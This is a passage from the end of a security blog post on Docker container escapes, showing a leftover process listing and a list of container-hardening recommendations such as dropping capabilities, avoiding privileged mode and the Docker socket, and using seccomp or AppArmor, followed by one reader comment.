class="bash plain">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; 0 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I&lt;&nbsp;&nbsp; 13:57&nbsp;&nbsp; 0:00 [rcu_gp]</code></div><div class="line number7 index6 alt2"><code class="bash plain">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; 0 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I&lt;&nbsp;&nbsp; 13:57&nbsp;&nbsp; 0:00 [rcu_par_gp]</code></div><div class="line number8 index7 alt1"><code class="bash plain">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 6&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; 0 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I&lt;&nbsp;&nbsp; 13:57&nbsp;&nbsp; 0:00 [kworker</code><code class="bash plain">/0</code><code class="bash plain">:0H-kblockd]</code></div><div class="line number9 index8 alt2"><code class="bash plain">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; 0 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I&lt;&nbsp;&nbsp; 13:57&nbsp;&nbsp; 0:00 [mm_percpu_wq]</code></div><div class="line number10 index9 alt1"><code class="bash plain">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 9&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; 0 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; S&nbsp;&nbsp;&nbsp; 13:57&nbsp;&nbsp; 0:00 [ksoftirqd</code><code class="bash plain">/0</code><code class="bash plain">]</code></div><div class="line number11 index10 alt2"><code class="bash plain">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 10&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; 0 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; I&nbsp;&nbsp;&nbsp; 13:57&nbsp;&nbsp; 0:00 [rcu_sched]</code></div><div class="line number12 index11 alt1"><code class="bash plain">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 11&nbsp; 0.0&nbsp; 0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp; 0 ?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; S&nbsp;&nbsp;&nbsp; 13:57&nbsp;&nbsp; 0:00 [migration</code><code class="bash plain">/0</code><code class="bash plain">]</code></div></div></td></tr></tbody></table></div></div>
<h2>Use containers securely</h2>
<p>Docker restricts and limits containers by default. Loosening these 
restrictions may create security issues, even without the full power of 
the <code>--privileged</code> flag. It is important to acknowledge the 
impact of each additional permission, and limit permissions overall to 
the minimum necessary.</p>
<p>To help keep containers secure:</p>
<ul>
<li>Do not use the <code>--privileged</code> flag or mount a <a href="https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/">Docker socket inside the container</a>.
 The docker socket allows for spawning containers, so it is an easy way 
to take full control of the host, for example, by running another 
container with the <code>--privileged</code> flag.</li>
<li>Do not run as root inside the container. Use a <a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user">different user</a> or <a href="https://docs.docker.com/engine/security/userns-remap/">user namespaces</a>.
 The root in the container is the same as on host unless remapped with 
user namespaces. It is only lightly restricted by, primarily, Linux 
namespaces, capabilities, and cgroups.</li>
<li><a href="https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities">Drop all capabilities</a> (<code>--cap-drop=all</code>) and enable only those that are required (<code>--cap-add=...</code>). Many of workloads don’t need any capabilities and adding them increases the scope of a potential attack.</li>
<li><a href="https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/">Use the “no-new-privileges” security option</a> to prevent processes from gaining more privileges, for example through suid binaries.</li>
<li><a href="https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources">Limit resources available to the container</a>. Resource limits can protect the machine from denial of service attacks.</li>
<li>Adjust <a href="https://docs.docker.com/engine/security/seccomp/">seccomp</a>, <a href="https://docs.docker.com/engine/security/apparmor/">AppArmor</a> (or SELinux) profiles to restrict the actions and syscalls available for the container to the minimum required.</li>
<li>Use <a href="https://docs.docker.com/docker-hub/official_images/">official docker images</a> or build your own based on them. Don’t inherit or use <a href="https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/">backdoored</a> images.</li>
<li>Regularly rebuild your images to apply security patches. This goes without saying.</li>
</ul>
<p>If you would like a second look at your organization’s critical infrastructure, Trail of Bits would love to help. Reach out and <a href="https://www.trailofbits.com/contact/">say hello</a>!</p>
<div id="jp-post-flair" class="sharedaddy sd-like-enabled sd-sharing-enabled"><div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-98969" class="share-twitter sd-button share-icon" href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/?share=twitter&amp;nb=1" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-98969" class="share-linkedin sd-button share-icon" href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/?share=linkedin&amp;nb=1" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/?share=reddit&amp;nb=1" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-telegram"><a rel="nofollow noopener noreferrer" data-shared="" class="share-telegram sd-button share-icon" href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/?share=telegram&amp;nb=1" target="_blank" title="Click to share on Telegram"><span>Telegram</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-98969" class="share-facebook sd-button share-icon" href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/?share=facebook&amp;nb=1" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-email share-service-visible"><a rel="nofollow noopener noreferrer" data-shared="" class="share-email sd-button share-icon" href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/?share=email&amp;nb=1" target="_blank" title="Click to email this to a friend"><span>Email</span></a></li><li class="share-print"><a rel="nofollow noopener noreferrer" data-shared="" class="share-print sd-button share-icon" href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#print" target="_blank" title="Click to print"><span>Print</span></a></li><li class="share-end"></li></ul></div></div></div><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-loaded" id="like-post-wrapper-3681601-98969-5d3ee4943f668" data-src="//widgets.wp.com/likes/index.html?ver=20190321#blog_id=3681601&amp;post_id=98969&amp;origin=trailofbits.wordpress.com&amp;obj_id=3681601-98969-5d3ee4943f668&amp;domain=blog.trailofbits.com" data-name="like-post-frame-3681601-98969-5d3ee4943f668"><h3 class="sd-title">Like this:</h3><div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px; display: none;"><span class="button"><span>Like</span></span> <span class="loading">Loading...</span></div><iframe class="post-likes-widget jetpack-likes-widget" name="like-post-frame-3681601-98969-5d3ee4943f668" src="CB19_files/index.html" width="100%" height="55px" frameborder="0"></iframe><span class="sd-text-color"></span><a class="sd-link-color"></a></div>
<div id="jp-relatedposts" class="jp-relatedposts" style="display: block;">
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
<div class="jp-relatedposts-items jp-relatedposts-items-minimal"><p class="jp-relatedposts-post jp-relatedposts-post0" data-post-id="98740" data-post-format="false"><span class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://blog.trailofbits.com/2019/05/31/fuzzing-unit-tests-with-deepstate-and-eclipser/" title="Fuzzing Unit Tests with DeepState and Eclipser

If unit tests are important to you, there's now another reason to use DeepState, our Google-Test-like property-based testing tool for C and C++. It's called Eclipser, a powerful new fuzzer very recently presented in an ICSE 2019 paper. We are proud to announce that Eclipser is now fully integrated into…" rel="nofollow" data-origin="98969" data-position="0">Fuzzing Unit Tests with DeepState and Eclipser</a></span><span class="jp-relatedposts-post-context">In "Dynamic Analysis"</span></p><p class="jp-relatedposts-post jp-relatedposts-post1" data-post-id="98915" data-post-format="false"><span class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://blog.trailofbits.com/2019/07/08/fuck-rsa/" title="Seriously, stop using RSA

Here at Trail of Bits we review a lot of code. From major open source projects to exciting new proprietary software, we’ve seen it all. But one common denominator in all of these systems is that for some inexplicable reason people still seem to think RSA is a good cryptosystem…" rel="nofollow" data-origin="98969" data-position="1">Seriously, stop using RSA</a></span><span class="jp-relatedposts-post-context">In "Cryptography"</span></p><p class="jp-relatedposts-post jp-relatedposts-post2" data-post-id="98767" data-post-format="false"><span class="jp-relatedposts-post-title"><a class="jp-relatedposts-post-a" href="https://blog.trailofbits.com/2019/06/07/announcing-manticore-0-3-0/" title="Announcing Manticore 0.3.0

Earlier this week, Manticore leapt forward to version 0.3.0. Advances for our symbolic execution engine now include: “fast forwarding” through concrete execution that you don’t care about, support for Linux binaries statically compiled for AArch64, and an interface for selectively solving for interesting test cases. We’ve been working really hard…" rel="nofollow" data-origin="98969" data-position="2">Announcing Manticore 0.3.0</a></span><span class="jp-relatedposts-post-context">In "Dynamic Analysis"</span></p></div></div></div>			</div><!-- .entry-content -->

	<footer class="entry-footer">
		<p class="entry-byline">By Dominik 'disconnect3d' Czarnota</p>
		<p class="cat-links">Posted in <a href="https://blog.trailofbits.com/category/containers/" rel="category tag">Containers</a>, <a href="https://blog.trailofbits.com/category/exploits/" rel="category tag">Exploits</a>, <a href="https://blog.trailofbits.com/category/kubernetes/" rel="category tag">Kubernetes</a></p>
			</footer>
</article><!-- #post-98969 -->
						<nav role="navigation" id="nav-below" class="site-navigation post-navigation">
			<h1 class="assistive-text">Post navigation</h1>

		
			<div class="nav-previous"><a href="https://blog.trailofbits.com/2019/07/16/trail-of-bits-named-in-forrester-wave-as-a-leader-in-midsize-cybersecurity-consulting-services/" rel="prev"><span class="meta-nav">←</span> Trail of Bits Named in Forrester Wave as a Leader in Midsize Cybersecurity Consulting&nbsp;Services</a></div>			
		
		</nav><!-- #nav-below -->
		
					<div id="comments" class="comments-area">
	
	
			<h2 class="comments-title">
			One thought on “<span>Understanding Docker container&nbsp;escapes</span>”		</h2>

		
		<ol class="commentlist">
					<li class="comment even thread-even depth-1 highlander-comment" id="li-comment-70535">
			<article id="comment-70535" class="comment">
				<footer>
					<div class="comment-author vcard">
						<img alt="" src="CB19_files/bbba4ee4c641e0a8cfe055a65bc338e3.png" class="avatar avatar-60 grav-hashed grav-hijack" id="grav-bbba4ee4c641e0a8cfe055a65bc338e3-0" width="60" height="60">						<cite class="comment-author-name fn">Anton</cite>
					</div><!-- .comment-author .vcard -->
					
					<div class="comment-meta commentmetadata">
						<a class="comment-link" href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#comment-70535"><time pubdate="" datetime="2019-07-21T03:01:05-04:00">
						July 21, 2019 at 3:01 am						</time></a>
						<a rel="nofollow" class="comment-reply-link" href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/?replytocom=70535#respond" data-commentid="70535" data-postid="98969" data-belowelement="comment-70535" data-respondelement="respond" aria-label="Reply to Anton">Reply</a>											</div><!-- .comment-meta .commentmetadata -->
				</footer>

				<div class="comment-content"><p>Nice walk-through and kudos for 
explaining the exact required components rather than using –privileged. A
 small note I want to suggest is that your code will only work in an 
environment with a single container (due to multiple results at the path
 search)</p>
</div>

			</article><!-- #comment-## -->

		</li><!-- #comment-## -->
		</ol>

		
	
	
		<div id="respond" class="comment-respond js">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#respond" style="display:none;">Cancel reply</a></small></h3>			<form action="https://blog.trailofbits.com/wp-comments-post.php" method="post" id="commentform" class="comment-form">
				<input type="hidden" id="highlander_comment_nonce" name="highlander_comment_nonce" value="1f409f45f2"><input type="hidden" name="_wp_http_referer" value="/2019/07/19/understanding-docker-container-escapes/">
<input type="hidden" name="hc_post_as" id="hc_post_as" value="guest">

<div class="comment-form-field comment-textarea">
	
	<div id="comment-form-comment"><textarea aria-hidden="true" tabindex="-1" style="position: absolute; inset: -999px auto auto 0px; border: 0px none; padding: 0px; box-sizing: content-box; overflow-wrap: break-word; height: 0px !important; min-height: 0px !important; overflow: hidden; transition: none 0s ease 0s; font-family: Arial, Helvetica, Tahoma, Verdana, sans-serif; font-size: 14px; font-weight: 400; font-style: normal; letter-spacing: 0px; text-transform: none; text-decoration: none; word-spacing: 0px; text-indent: 0px; line-height: 21px; width: 668px;" class="autosizejs ">Enter your comment here...</textarea><textarea id="comment" name="comment" title="Enter your comment here..." placeholder="Enter your comment here..." style="height: 41px; overflow: hidden; overflow-wrap: break-word; resize: none;"></textarea></div>
</div>

<div id="comment-form-identity" style="display: none;">
	<div id="comment-form-nascar">
		<p>Fill in your details below or click an icon to log in:</p>
		<ul>
			<li class="selected" style="display:none;">
				<a href="#comment-form-guest" id="postas-guest" class="nascar-signin-link" title="Login via Guest">
									</a>
			</li>
			<li>
				<a href="#comment-form-load-service:WordPress.com" id="postas-wordpress" class="nascar-signin-link" title="Login via WordPress.com">
					<svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#0087be" d="M12.158 12.786l-2.698 7.84c.806.236 1.657.365 2.54.365 1.047 0 2.05-.18 2.986-.51-.024-.037-.046-.078-.065-.123l-2.762-7.57zM3.008 12c0 3.56 2.07 6.634 5.068 8.092L3.788 8.342c-.5 1.117-.78 2.354-.78 3.658zm15.06-.454c0-1.112-.398-1.88-.74-2.48-.456-.74-.883-1.368-.883-2.11 0-.825.627-1.595 1.51-1.595.04 0 .078.006.116.008-1.598-1.464-3.73-2.36-6.07-2.36-3.14 0-5.904 1.613-7.512 4.053.21.008.41.012.58.012.94 0 2.395-.114 2.395-.114.484-.028.54.684.057.74 0 0-.487.058-1.03.086l3.275 9.74 1.968-5.902-1.4-3.838c-.485-.028-.944-.085-.944-.085-.486-.03-.43-.77.056-.742 0 0 1.484.114 2.368.114.94 0 2.397-.114 2.397-.114.486-.028.543.684.058.74 0 0-.488.058-1.03.086l3.25 9.665.897-2.997c.456-1.17.684-2.137.684-2.907zm1.82-3.86c.04.286.06.593.06.924 0 .912-.17 1.938-.683 3.22l-2.746 7.94c2.672-1.558 4.47-4.454 4.47-7.77 0-1.564-.4-3.033-1.1-4.314zM12 22C6.486 22 2 17.514 2 12S6.486 2 12 2s10 4.486 10 10-4.486 10-10 10z"></path></g></svg>				</a>
			</li>
			<li>
			</li><li>
				<a href="#comment-form-load-service:Twitter" id="postas-twitter" class="nascar-signin-link" title="Login via Twitter">
					<svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#1DA1F2" d="M22.23 5.924c-.736.326-1.527.547-2.357.646.847-.508 1.498-1.312 1.804-2.27-.793.47-1.67.812-2.606.996C18.325 4.498 17.258 4 16.078 4c-2.266 0-4.103 1.837-4.103 4.103 0 .322.036.635.106.935-3.41-.17-6.433-1.804-8.457-4.287-.353.607-.556 1.312-.556 2.064 0 1.424.724 2.68 1.825 3.415-.673-.022-1.305-.207-1.86-.514v.052c0 1.988 1.415 3.647 3.293 4.023-.344.095-.707.145-1.08.145-.265 0-.522-.026-.773-.074.522 1.63 2.038 2.817 3.833 2.85-1.404 1.1-3.174 1.757-5.096 1.757-.332 0-.66-.02-.98-.057 1.816 1.164 3.973 1.843 6.29 1.843 7.547 0 11.675-6.252 11.675-11.675 0-.178-.004-.355-.012-.53.802-.578 1.497-1.3 2.047-2.124z"></path></g></svg>				</a>
			</li>
			<li>
				<a href="#comment-form-load-service:Facebook" id="postas-facebook" class="nascar-signin-link" title="Login via Facebook">
					<svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#3B5998" d="M20.007 3H3.993C3.445 3 3 3.445 3 3.993v16.013c0 .55.445.994.993.994h8.62v-6.97H10.27V11.31h2.346V9.31c0-2.325 1.42-3.59 3.494-3.59.993 0 1.847.073 2.096.106v2.43h-1.438c-1.128 0-1.346.537-1.346 1.324v1.734h2.69l-.35 2.717h-2.34V21h4.587c.548 0 .993-.445.993-.993V3.993c0-.548-.445-.993-.993-.993z"></path></g></svg>				</a>
			</li>
		</ul>
	</div>

	<div id="comment-form-guest" class="comment-form-service selected">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
<a href="https://gravatar.com/site/signup/" target="_blank">				<img src="CB19_files/ad516503a11cd5ca435acc9bb6523536.png" alt="Gravatar" class="no-grav" width="25">
</a>			</div>

				<div class="comment-form-fields">
				<div class="comment-form-field comment-form-email">
					<label for="email">Email <span class="required">(required)</span> <span class="nopublish">(Address never made public)</span></label>
					<div class="comment-form-input"><input id="email" name="email" type="email"></div>
				</div>
				<div class="comment-form-field comment-form-author">
					<label for="author">Name <span class="required">(required)</span></label>
					<div class="comment-form-input"><input id="author" name="author" type="text"></div>
				</div>
				<div class="comment-form-field comment-form-url">
					<label for="url">Website</label>
					<div class="comment-form-input"><input id="url" name="url" type="url"></div>
				</div>
			</div>
			
		</div>
	</div>

	<div id="comment-form-wordpress" class="comment-form-service">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
				<img src="CB19_files/ad516503a11cd5ca435acc9bb6523536.png" alt="WordPress.com Logo" class="no-grav" width="25">
			</div>

				<div class="comment-form-fields">
				<input type="hidden" name="wp_avatar" id="wordpress-avatar" class="comment-meta-wordpress" value="">
				<input type="hidden" name="wp_user_id" id="wordpress-user_id" class="comment-meta-wordpress" value="">
				<input type="hidden" name="wp_access_token" id="wordpress-access_token" class="comment-meta-wordpress" value="">
						<p class="comment-form-posting-as pa-wordpress">
			<strong></strong>
			You are commenting using your WordPress.com account.			<span class="comment-form-log-out">
				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'wordpress' );">Log&nbsp;Out</a>&nbsp;/&nbsp;
				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)
			</span>
			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#0087be" d="M12.158 12.786l-2.698 7.84c.806.236 1.657.365 2.54.365 1.047 0 2.05-.18 2.986-.51-.024-.037-.046-.078-.065-.123l-2.762-7.57zM3.008 12c0 3.56 2.07 6.634 5.068 8.092L3.788 8.342c-.5 1.117-.78 2.354-.78 3.658zm15.06-.454c0-1.112-.398-1.88-.74-2.48-.456-.74-.883-1.368-.883-2.11 0-.825.627-1.595 1.51-1.595.04 0 .078.006.116.008-1.598-1.464-3.73-2.36-6.07-2.36-3.14 0-5.904 1.613-7.512 4.053.21.008.41.012.58.012.94 0 2.395-.114 2.395-.114.484-.028.54.684.057.74 0 0-.487.058-1.03.086l3.275 9.74 1.968-5.902-1.4-3.838c-.485-.028-.944-.085-.944-.085-.486-.03-.43-.77.056-.742 0 0 1.484.114 2.368.114.94 0 2.397-.114 2.397-.114.486-.028.543.684.058.74 0 0-.488.058-1.03.086l3.25 9.665.897-2.997c.456-1.17.684-2.137.684-2.907zm1.82-3.86c.04.286.06.593.06.924 0 .912-.17 1.938-.683 3.22l-2.746 7.94c2.672-1.558 4.47-4.454 4.47-7.77 0-1.564-.4-3.033-1.1-4.314zM12 22C6.486 22 2 17.514 2 12S6.486 2 12 2s10 4.486 10 10-4.486 10-10 10z"></path></g></svg></span>
		</p>
					</div>
	
		</div>
	</div>

	<div id="comment-form-googleplus" class="comment-form-service">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
				<img src="CB19_files/ad516503a11cd5ca435acc9bb6523536.png" alt="Google photo" class="no-grav" width="25">
			</div>

				<div class="comment-form-fields">
				<input type="hidden" name="googleplus_avatar" id="googleplus-avatar" class="comment-meta-googleplus" value="">
				<input type="hidden" name="googleplus_user_id" id="googleplus-user_id" class="comment-meta-googleplus" value="">
				<input type="hidden" name="googleplus_access_token" id="googleplus-access_token" class="comment-meta-googleplus" value="">
						<p class="comment-form-posting-as pa-googleplus">
			<strong></strong>
			You are commenting using your Google account.			<span class="comment-form-log-out">
				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'googleplus' );">Log&nbsp;Out</a>&nbsp;/&nbsp;
				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)
			</span>
			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" x="0px" y="0px" viewBox="0 0 60 60"><path fill="#519bf7" d="M56.3,30c0,-1.6 -0.2,-3.4 -0.6,-5h-3.1H42.2H30v10.6h14.8C44,39.3 42,42 39.1,43.9l8.8,6.8C53,46 56.3,39 56.3,30z"></path><path fill="#3db366" d="M30,57.5c6.7,0 13.1,-2.4 17.9,-6.8l-8.8,-6.8c-2.5,1.6 -5.6,2.4 -9.1,2.4c-7.2,0 -13.3,-4.7 -15.4,-11.2l-9.3,7.1C9.8,51.3 19.1,57.5 30,57.5z"></path><path fill="#fdc600" d="M5.3,42.2l9.3,-7.1c-0.5,-1.6 -0.8,-3.3 -0.8,-5.1s0.3,-3.5 0.8,-5.1l-9.3,-7.1C3.5,21.5 2.5,25.6 2.5,30S3.5,38.5 5.3,42.2z"></path><path fill="#f15b44" d="M40.1,17.4l8,-8C43.3,5.1 37,2.5 30,2.5C19.1,2.5 9.8,8.7 5.3,17.8l9.3,7.1c2.1,-6.5 8.2,-11.1 15.4,-11.1C33.9,13.7 37.4,15.1 40.1,17.4z"></path></svg></span>
		</p>
					</div>
	
		</div>
	</div>

	<div id="comment-form-twitter" class="comment-form-service">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
				<img src="CB19_files/ad516503a11cd5ca435acc9bb6523536.png" alt="Twitter picture" class="no-grav" width="25">
			</div>

				<div class="comment-form-fields">
				<input type="hidden" name="twitter_avatar" id="twitter-avatar" class="comment-meta-twitter" value="">
				<input type="hidden" name="twitter_user_id" id="twitter-user_id" class="comment-meta-twitter" value="">
				<input type="hidden" name="twitter_access_token" id="twitter-access_token" class="comment-meta-twitter" value="">
						<p class="comment-form-posting-as pa-twitter">
			<strong></strong>
			You are commenting using your Twitter account.			<span class="comment-form-log-out">
				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'twitter' );">Log&nbsp;Out</a>&nbsp;/&nbsp;
				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)
			</span>
			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#1DA1F2" d="M22.23 5.924c-.736.326-1.527.547-2.357.646.847-.508 1.498-1.312 1.804-2.27-.793.47-1.67.812-2.606.996C18.325 4.498 17.258 4 16.078 4c-2.266 0-4.103 1.837-4.103 4.103 0 .322.036.635.106.935-3.41-.17-6.433-1.804-8.457-4.287-.353.607-.556 1.312-.556 2.064 0 1.424.724 2.68 1.825 3.415-.673-.022-1.305-.207-1.86-.514v.052c0 1.988 1.415 3.647 3.293 4.023-.344.095-.707.145-1.08.145-.265 0-.522-.026-.773-.074.522 1.63 2.038 2.817 3.833 2.85-1.404 1.1-3.174 1.757-5.096 1.757-.332 0-.66-.02-.98-.057 1.816 1.164 3.973 1.843 6.29 1.843 7.547 0 11.675-6.252 11.675-11.675 0-.178-.004-.355-.012-.53.802-.578 1.497-1.3 2.047-2.124z"></path></g></svg></span>
		</p>
					</div>
	
		</div>
	</div>

	<div id="comment-form-facebook" class="comment-form-service">
		<div class="comment-form-padder">
			<div class="comment-form-avatar">
				<img src="CB19_files/ad516503a11cd5ca435acc9bb6523536.png" alt="Facebook photo" class="no-grav" width="25">
			</div>

				<div class="comment-form-fields">
				<input type="hidden" name="fb_avatar" id="facebook-avatar" class="comment-meta-facebook" value="">
				<input type="hidden" name="fb_user_id" id="facebook-user_id" class="comment-meta-facebook" value="">
				<input type="hidden" name="fb_access_token" id="facebook-access_token" class="comment-meta-facebook" value="">
						<p class="comment-form-posting-as pa-facebook">
			<strong></strong>
			You are commenting using your Facebook account.			<span class="comment-form-log-out">
				(&nbsp;<a href="javascript:HighlanderComments.doExternalLogout( 'facebook' );">Log&nbsp;Out</a>&nbsp;/&nbsp;
				<a href="#" onclick="javascript:HighlanderComments.switchAccount();return false;">Change</a>&nbsp;)
			</span>
			<span class="pa-icon"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24"><rect x="0" fill="none" width="24" height="24"></rect><g><path fill="#3B5998" d="M20.007 3H3.993C3.445 3 3 3.445 3 3.993v16.013c0 .55.445.994.993.994h8.62v-6.97H10.27V11.31h2.346V9.31c0-2.325 1.42-3.59 3.494-3.59.993 0 1.847.073 2.096.106v2.43h-1.438c-1.128 0-1.346.537-1.346 1.324v1.734h2.69l-.35 2.717h-2.34V21h4.587c.548 0 .993-.445.993-.993V3.993c0-.548-.445-.993-.993-.993z"></path></g></svg></span>
		</p>
					</div>
	
		</div>
	</div>


	<div id="comment-form-load-service" class="comment-form-service">
		<div class="comment-form-posting-as-cancel"><a href="javascript:HighlanderComments.cancelExternalWindow();">Cancel</a></div>
		<p>Connecting to %s</p>
	</div>

</div>

<script type="text/javascript">
var highlander_expando_javascript = function(){
	var input = document.createElement( 'input' ),
	    comment = jQuery( '#comment' );

	if ( 'placeholder' in input ) {
		comment.attr( 'placeholder', jQuery( '.comment-textarea label' ).remove().text() );
	}

	// Expando Mode: start small, then auto-resize on first click + text length
	jQuery( '#comment-form-identity' ).hide();
	jQuery( '#comment-form-subscribe' ).hide();
	jQuery( '#commentform .form-submit' ).hide();

	comment.css( { 'height':'10px' } ).one( 'focus', function() {
		var timer = setInterval( HighlanderComments.resizeCallback, 10 )
		jQuery( this ).animate( { 'height': HighlanderComments.initialHeight } ).delay( 100 ).queue( function(n) { clearInterval( timer ); HighlanderComments.resizeCallback(); n(); } );
		jQuery( '#comment-form-identity' ).slideDown();
		jQuery( '#comment-form-subscribe' ).slideDown();
		jQuery( '#commentform .form-submit' ).slideDown();
	});
}
jQuery(document).ready( highlander_expando_javascript );
</script>

<div id="comment-form-subscribe" style="display: none;">
	<p class="comment-subscription-form"><input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;"> <label class="subscribe-label" id="subscribe-label" for="subscribe" style="display: inline;">Notify me of new comments via email.</label></p><p class="post-subscription-form"><input type="checkbox" name="subscribe_blog" id="subscribe_blog" value="subscribe" style="width: auto;"> <label class="subscribe-label" id="subscribe-blog-label" for="subscribe_blog" style="display: inline;">Notify me of new posts via email.</label></p></div>




<p class="form-submit" style="display: none;"><input name="submit" type="submit" id="comment-submit" class="submit" value="Post Comment"> <input type="hidden" name="comment_post_ID" value="98969" id="comment_post_ID">
<input type="hidden" name="comment_parent" id="comment_parent" value="0">
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="22ff384548"></p>
<input type="hidden" name="genseq" value="1564402836">
<p style="display: none;"></p>			<input type="hidden" id="ak_js" name="ak_js" value="1564402836560"></form>
			</div><!-- #respond -->
	<div style="clear: both"></div>
</div><!-- #comments .comments-area -->

			
			</div><!-- #content -->
		</div><!-- #primary .site-content -->

		<div id="secondary" class="widget-area" role="complementary">
						<aside id="search-4" class="widget widget_search">	<form method="get" id="searchform" action="https://blog.trailofbits.com/" role="search">
		<label for="s" class="assistive-text">Search</label>
		<input type="search" class="field" name="s" id="s" placeholder="Search …">
		<input type="submit" class="submit" name="submit" id="searchsubmit" value="Search">
	</form>
</aside><aside id="text-112416548" class="widget widget_text"><h1 class="widget-title">About Us</h1>			<div class="textwidget"><p>Since
 2012, Trail of Bits has helped secure some of the world’s most targeted
 organizations and products. We combine high-­end security research with
 a real­ world attacker mentality to reduce risk and fortify code.</p>
<p>Read more at <a href="https://www.trailofbits.com/">www.trailofbits.com</a></p>
</div>
